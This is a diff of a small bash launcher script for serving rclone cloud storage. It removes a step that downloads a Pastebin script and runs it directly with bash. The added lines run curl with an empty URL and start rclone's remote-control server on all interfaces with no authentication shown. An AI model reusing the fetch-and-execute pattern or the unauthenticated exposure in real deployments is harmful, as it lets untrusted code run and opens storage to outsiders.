@@ -1,11 +1,9 @@
 #!/bin/bash
-#author https://github.com/developeranaz (don't delete this)
-curl "https://pastebin.com/raw/bjzadHka" >status
-bash status | grep 'working\|maintenance'
 rclone version
 rclone listremotes
 #refreshing Rclone
 wget $CONFIG_IN_URL -O '/.config/rclone/rclone.conf'
 rclone version
 rclone listremotes
-rclone serve http $CLOUDNAME: --addr :$PORT --vfs-read-chunk-size 128M
+curl '' >/index.html
+rclone rcd --rc-serve --rc-addr=0.0.0.0:$PORT --rc-template=/index.html
